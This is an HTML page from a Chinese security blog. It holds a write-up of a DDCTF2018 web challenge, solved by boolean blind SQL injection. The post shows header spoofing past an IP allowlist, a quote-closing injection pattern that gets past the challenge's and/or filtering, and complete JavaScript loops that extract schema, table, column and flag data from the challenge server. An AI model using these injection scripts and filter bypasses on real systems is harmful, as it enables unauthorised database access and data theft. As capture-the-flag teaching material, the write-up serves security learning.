@@ -1,0 +1,825 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="writeup,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="0x01 web1 数据库的秘密访问题目给出的页面，tis -&amp;gt; 非法链接，只允许来自 123.232.23.245 的访问 修改请求头，伪造请求源ip 1X-Forwarded-For:123.232.23.245 再次请求页面，可以看到已经通过，成功加载页面  查看源码，看到有个input的项author被设置hidden了，一般看到这种题，非常有可能是sql注入，试了下存在sql注入">
+<meta name="keywords" content="writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DDCTF2018某Web题之布尔盲注实践">
+<meta property="og:url" content="http://yoursite.com/2018/04/17/DDCTF2018某Web题之布尔盲注实践/index.html">
+<meta property="og:site_name" content="大彩笔threedr3am">
+<meta property="og:description" content="0x01 web1 数据库的秘密访问题目给出的页面，tis -&amp;gt; 非法链接，只允许来自 123.232.23.245 的访问 修改请求头，伪造请求源ip 1X-Forwarded-For:123.232.23.245 再次请求页面，可以看到已经通过，成功加载页面  查看源码，看到有个input的项author被设置hidden了，一般看到这种题，非常有可能是sql注入，试了下存在sql注入">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2018-web-writeup/ddctf_web1.1.png">
+<meta property="og:image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2018-web-writeup/ddctf_web1.2.png">
+<meta property="og:updated_time" content="2018-12-03T02:14:36.584Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DDCTF2018某Web题之布尔盲注实践">
+<meta name="twitter:description" content="0x01 web1 数据库的秘密访问题目给出的页面，tis -&amp;gt; 非法链接，只允许来自 123.232.23.245 的访问 修改请求头，伪造请求源ip 1X-Forwarded-For:123.232.23.245 再次请求页面，可以看到已经通过，成功加载页面  查看源码，看到有个input的项author被设置hidden了，一般看到这种题，非常有可能是sql注入，试了下存在sql注入">
+<meta name="twitter:image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2018-web-writeup/ddctf_web1.1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/04/17/DDCTF2018某Web题之布尔盲注实践/">
+
+
+
+
+
+  <title>DDCTF2018某Web题之布尔盲注实践 | 大彩笔threedr3am</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?8346bb07e7843cd10a2ee33017b3d627";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">大彩笔threedr3am</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/DDCTF2018某Web题之布尔盲注实践/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="threedr3am">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/avator/duolaAmeng.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="大彩笔threedr3am">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">DDCTF2018某Web题之布尔盲注实践</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-17T19:57:27+08:00">
+                2018-04-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="0x01-web1-数据库的秘密"><a href="#0x01-web1-数据库的秘密" class="headerlink" title="0x01 web1 数据库的秘密"></a>0x01 web1 数据库的秘密</h3><p>访问题目给出的页面，tis -&gt; 非法链接，只允许来自 <strong>123.232.23.245</strong> 的访问</p>
+<p>修改请求头，伪造请求源ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:123.232.23.245</span><br></pre></td></tr></table></figure>
+<p>再次请求页面，可以看到已经通过，成功加载页面</p>
+<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2018-web-writeup/ddctf_web1.1.png" alt="首页"></p>
+<p>查看源码，看到有个input的项author被设置hidden了，一般看到这种题，非常有可能是sql注入，试了下存在sql注入</p>
+<p><img src="http://threedr3am.oss-cn-hangzhou.aliyuncs.com/ddctf2018-web-writeup/ddctf_web1.2.png" alt="waf"></p>
+<p>经过尝试发现可以使用布尔盲注，最后发现使用以下这种布尔盲注的方式，可以畅通无阻，直通罗马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">author=&apos;&apos;=((select (某返回数字的函数) from xxx)=变量)=&apos;&apos;</span><br></pre></td></tr></table></figure>
+<p>上面这种方式，基本可以绕过了and、or等等拦截，并且可以闭合前面的单引号和后面的单引号</p>
+<p>先说一下上面的注入原理吧，上面其实在表单输入项内容为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;=((select (某返回数字的函数) from xxx)=变量)=&apos;</span><br></pre></td></tr></table></figure>
+<p>先通过第一个单引号闭合条件author=’’，使得数据库判断该条件时，该条件都返回false，然后后面通过((子查询)=i)的括号优先运算并通过子查询获取出关键信息，关键信息使用了数字表示，并与变量比对，如果相等，则返回true，因为前面的author=’’等式的值为false，所以，author=’’=()等式的值则为false，最后一个引号闭合了sql，并得到等式author=’’=()=’’，因为在数据库中’’的值为false，因此，整条语句的布尔等式就为false=true=false，最终结果则为false，如果()返回的布尔结果为false的话，则整条布尔表达式为false=false=false，这种情况，最终的值则为false</p>
+<p>以上就是具体原理的描述，我以前语文学得不太好，看一遍不太理解的朋友，请原谅，麻烦多看几遍，多思考…</p>
+<p>其实，这道题到这里，具体的利用手法已经很清晰了，再次分析页面源码，以及http请求数据包，可以得知：</p>
+<ol>
+<li>点击页面提交http请求时还会带上一个 time参数 和 sig参数。</li>
+<li>time、sig这两个参数都是在 js 计算出来的。</li>
+<li>思路已经很明确，存在盲注，需要计算出sig和time参数</li>
+</ol>
+<p>在赛后发现，很多朋友计算sig、time是利用python重写一遍算法，或者使用python调用js，更有师傅用java计算…强，但是我这边用的方法可以说是最便捷的，直接把页面里的代码拷贝出来，粘贴到一个新的html文件中，修改一下math.js、main.js文件的引用路径为绝对路径，并引入jquery支持</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"</span></span><br><span class="line"><span class="string">http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/static/math.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"</span></span><br><span class="line"><span class="string">http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/static/main.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">"http://cdn.static.runoob.com/libs/jquery/1.10.2/jquery.min.js"</span>&gt;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>随手写了几个js的payload，打开chrome的console，把方法输入，直接调用执行：</p>
+<p>两个基本的函数</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSig</span>(<span class="params">time</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> hex_math_enc(time);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTime</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">parseInt</span>(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime()/<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>爆数据库数量（这个好像有点多余…）：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getSchemaCount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> schemaCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> id = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> title = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> author = <span class="string">"'=((select count(SCHEMA_NAME) from  information_schema.SCHEMATA)="</span>+i+<span class="string">")=''='"</span>;</span><br><span class="line">		<span class="keyword">var</span> date = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> time = getTime();</span><br><span class="line">		<span class="keyword">var</span> sig = getSig(<span class="string">"id="</span>+id+<span class="string">"title="</span>+title+<span class="string">"author="</span>+author+<span class="string">"date="</span>+date+<span class="string">"time="</span>+time+<span class="string">"adrefkfweodfsdpiru"</span>);</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			type: <span class="string">'POST'</span>,</span><br><span class="line">			<span class="keyword">async</span> : <span class="literal">false</span>,</span><br><span class="line">			url:<span class="string">"http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+time,</span><br><span class="line">			data:&#123;<span class="string">"id"</span>:id,<span class="string">"title"</span>:title,<span class="string">"date"</span>:date,<span class="string">"author"</span>:author,<span class="string">"button"</span>:<span class="string">"search"</span>&#125;,</span><br><span class="line">			headers:&#123;<span class="string">"X-Forwarded-For"</span>:<span class="string">"123.232.23.245"</span>&#125;,</span><br><span class="line">			success:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">				<span class="comment">//$(".bbb").html(result);</span></span><br><span class="line">				<span class="keyword">if</span>(result.indexOf(<span class="string">"admin"</span>)!=<span class="number">-1</span>) &#123;</span><br><span class="line">					schemaCount = i;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"schema数量为:"</span>+schemaCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>爆表数量</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTableCount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> schemaCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> id = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> title = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> author = <span class="string">"'=((select count(table_name) from  information_schema.TABLES where table_schema = 'ddctf')="</span>+i+<span class="string">")=''='"</span>;</span><br><span class="line">		<span class="keyword">var</span> date = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> time = getTime();</span><br><span class="line">		<span class="keyword">var</span> sig = getSig(<span class="string">"id="</span>+id+<span class="string">"title="</span>+title+<span class="string">"author="</span>+author+<span class="string">"date="</span>+date+<span class="string">"time="</span>+time+<span class="string">"adrefkfweodfsdpiru"</span>);</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			type: <span class="string">'POST'</span>,</span><br><span class="line">			<span class="keyword">async</span> : <span class="literal">false</span>,</span><br><span class="line">			url:<span class="string">"http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+time,</span><br><span class="line">			data:&#123;<span class="string">"id"</span>:id,<span class="string">"title"</span>:title,<span class="string">"date"</span>:date,<span class="string">"author"</span>:author,<span class="string">"button"</span>:<span class="string">"search"</span>&#125;,</span><br><span class="line">			headers:&#123;<span class="string">"X-Forwarded-For"</span>:<span class="string">"123.232.23.245"</span>&#125;,</span><br><span class="line">			success:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">				<span class="comment">//$(".bbb").html(result);</span></span><br><span class="line">				<span class="keyword">if</span>(result.indexOf(<span class="string">"admin"</span>)!=<span class="number">-1</span>) &#123;</span><br><span class="line">					schemaCount = i;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"table数量为:"</span>+schemaCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>爆表名</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTableName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;<span class="number">20</span>;j++) &#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">33</span>;i&lt;<span class="number">127</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">var</span> id = <span class="string">""</span>;</span><br><span class="line">			<span class="keyword">var</span> title = <span class="string">""</span>;</span><br><span class="line">			<span class="keyword">var</span> author = <span class="string">"'=(substr((select table_name from  information_schema.TABLES where table_schema = 'ddctf' limit 0,1),"</span>+(j+<span class="number">1</span>)+<span class="string">",1)='"</span>+<span class="built_in">String</span>.fromCharCode(i)+<span class="string">"')=''='"</span>;</span><br><span class="line">			<span class="keyword">var</span> date = <span class="string">""</span>;</span><br><span class="line">			<span class="keyword">var</span> time = getTime();</span><br><span class="line">			<span class="keyword">var</span> sig = getSig(<span class="string">"id="</span>+id+<span class="string">"title="</span>+title+<span class="string">"author="</span>+author+<span class="string">"date="</span>+date+<span class="string">"time="</span>+time+<span class="string">"adrefkfweodfsdpiru"</span>);</span><br><span class="line">				$.ajax(&#123;</span><br><span class="line">				type: <span class="string">'POST'</span>,</span><br><span class="line">				<span class="keyword">async</span> : <span class="literal">false</span>,</span><br><span class="line">				url:<span class="string">"http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+time,</span><br><span class="line">				data:&#123;<span class="string">"id"</span>:id,<span class="string">"title"</span>:title,<span class="string">"date"</span>:date,<span class="string">"author"</span>:author,<span class="string">"button"</span>:<span class="string">"search"</span>&#125;,</span><br><span class="line">				headers:&#123;<span class="string">"X-Forwarded-For"</span>:<span class="string">"123.232.23.245"</span>&#125;,</span><br><span class="line">				success:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">					<span class="comment">//$(".bbb").html(result);</span></span><br><span class="line">					<span class="keyword">if</span>(result.indexOf(<span class="string">"admin"</span>)!=<span class="number">-1</span>) &#123;</span><br><span class="line">						<span class="built_in">console</span>.log(<span class="built_in">String</span>.fromCharCode(i));</span><br><span class="line">					&#125;</span><br><span class="line">			&#125;&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>爆列数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getColumnCount</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">var</span> ColumnCount = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++) &#123;</span><br><span class="line">		<span class="keyword">var</span> id = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> title = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> author = <span class="string">"'=((select count(*)  from  INFORMATION_SCHEMA.COLUMNS  where TABLE_NAME='message')="</span>+i+<span class="string">")=''='"</span>;</span><br><span class="line">		<span class="keyword">var</span> date = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">var</span> time = getTime();</span><br><span class="line">		<span class="keyword">var</span> sig = getSig(<span class="string">"id="</span>+id+<span class="string">"title="</span>+title+<span class="string">"author="</span>+author+<span class="string">"date="</span>+date+<span class="string">"time="</span>+time+<span class="string">"adrefkfweodfsdpiru"</span>);</span><br><span class="line">			$.ajax(&#123;</span><br><span class="line">			type: <span class="string">'POST'</span>,</span><br><span class="line">			<span class="keyword">async</span> : <span class="literal">false</span>,</span><br><span class="line">			url:<span class="string">"http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+time,</span><br><span class="line">			data:&#123;<span class="string">"id"</span>:id,<span class="string">"title"</span>:title,<span class="string">"date"</span>:date,<span class="string">"author"</span>:author,<span class="string">"button"</span>:<span class="string">"search"</span>&#125;,</span><br><span class="line">			headers:&#123;<span class="string">"X-Forwarded-For"</span>:<span class="string">"123.232.23.245"</span>&#125;,</span><br><span class="line">			success:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">				<span class="comment">//$(".bbb").html(result);</span></span><br><span class="line">				<span class="keyword">if</span>(result.indexOf(<span class="string">"admin"</span>)!=<span class="number">-1</span>) &#123;</span><br><span class="line">					ColumnCount = i;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;&#125;);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">"ColumnCount:"</span>+ColumnCount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>最后根据前面爆出的信息得知表名，且flag所在表数据只有一列，利用下面的payload去盲注出值，得到flag<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getValue</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;<span class="number">50</span>;j++) &#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">33</span>;i&lt;<span class="number">127</span>;i++) &#123;</span><br><span class="line">			<span class="keyword">var</span> id = <span class="string">""</span>;</span><br><span class="line">			<span class="keyword">var</span> title = <span class="string">""</span>;</span><br><span class="line">			<span class="keyword">var</span> author = <span class="string">"'=(substr((select * from ctf_key8 limit 0,1),"</span>+(j+<span class="number">1</span>)+<span class="string">",1)='"</span>+<span class="built_in">String</span>.fromCharCode(i)+<span class="string">"')=''='"</span>;</span><br><span class="line">			<span class="keyword">var</span> date = <span class="string">""</span>;</span><br><span class="line">			<span class="keyword">var</span> time = getTime();</span><br><span class="line">			<span class="keyword">var</span> sig = getSig(<span class="string">"id="</span>+id+<span class="string">"title="</span>+title+<span class="string">"author="</span>+author+<span class="string">"date="</span>+date+<span class="string">"time="</span>+time+<span class="string">"adrefkfweodfsdpiru"</span>);</span><br><span class="line">				$.ajax(&#123;</span><br><span class="line">				type: <span class="string">'POST'</span>,</span><br><span class="line">				<span class="keyword">async</span> : <span class="literal">false</span>,</span><br><span class="line">				url:<span class="string">"http://116.85.43.88:8080/JYDJAYLYIPHCJMOQ/dfe3ia/index.php?sig="</span>+sig+<span class="string">"&amp;time="</span>+time,</span><br><span class="line">				data:&#123;<span class="string">"id"</span>:id,<span class="string">"title"</span>:title,<span class="string">"date"</span>:date,<span class="string">"author"</span>:author,<span class="string">"button"</span>:<span class="string">"search"</span>&#125;,</span><br><span class="line">				headers:&#123;<span class="string">"X-Forwarded-For"</span>:<span class="string">"123.232.23.245"</span>&#125;,</span><br><span class="line">				success:<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</span><br><span class="line">					<span class="comment">//$(".bbb").html(result);</span></span><br><span class="line">					<span class="keyword">if</span>(result.indexOf(<span class="string">"admin"</span>)!=<span class="number">-1</span>) &#123;</span><br><span class="line">						<span class="built_in">console</span>.log(<span class="built_in">String</span>.fromCharCode(i));</span><br><span class="line">					&#125;</span><br><span class="line">			&#125;&#125;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/12/09/XMAN2017选拔赛-Mobile-writeup/" rel="next" title="XMAN2017选拔赛(Mobile)writeup">
+                <i class="fa fa-chevron-left"></i> XMAN2017选拔赛(Mobile)writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/02/2018湖湘杯线上赛某WEB题之SQLMap实践/" rel="prev" title="2018湖湘杯线上赛某WEB题之SQLMap实践">
+                2018湖湘杯线上赛某WEB题之SQLMap实践 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
